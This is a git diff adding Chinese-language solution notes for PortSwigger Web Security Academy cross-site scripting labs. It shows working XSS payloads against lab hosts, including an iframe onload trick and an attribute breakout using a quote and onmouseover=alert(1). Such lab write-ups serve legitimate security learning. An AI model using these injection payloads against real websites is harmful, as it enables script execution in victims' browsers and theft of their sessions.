@@ -109,7 +109,7 @@ https://ac6d1f461e264285c0fc03c8006000e4.web-security-academy.net/feedback?retur
 To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. 
 
 ### 題目解釋
-
+在 jQuery 裡面塞 XSS，他不用管句法的完整性，只要有 html 就會執行了
 
 ### 解答
 
@@ -176,3 +176,39 @@ https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#%3Cimg%20src=
 <iframe src="https://ace11fbf1f8f9486c0e1ac8100d700c0.web-security-academy.net/#meow" onload="meow()">
 </iframe>
 ```
+
+## [Lab: Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)
+### 題目敘述
+ This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function. 
+### 題目解釋
+不能用 HTML 的角括號，試試看汙染 HTML 的 attribute，用一些事件來構成 XSS
+
+### 解答
+發現 如果丟最基本的 XSS
+```
+https://ac4e1fb81fd35987c09c1b03005500aa.web-security-academy.net/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+```
+
+會被 HTML Entity 給 Encode
+
+```
+<input type=text placeholder='Search the blog...' name=search value="&lt;script&gt;alert(1)&lt;/script&gt;">
+```
+
+
+
+如果輸入 `123"` 的話，會變成
+
+```
+<input type=text placeholder='Search the blog...' name=search value="123"">
+```
+
+代表可以用 `"` 關閉 value 的雙引號
+
+使用 `onmouseover` 這個事件，就過了
+
+```
+https://ac4e1fb81fd35987c09c1b03005500aa.web-security-academy.net/?search=123%22%20onmouseover=%22alert(1)
+```
+
+但我覺得沒有很清楚就是他不是打開就會跳 QQ
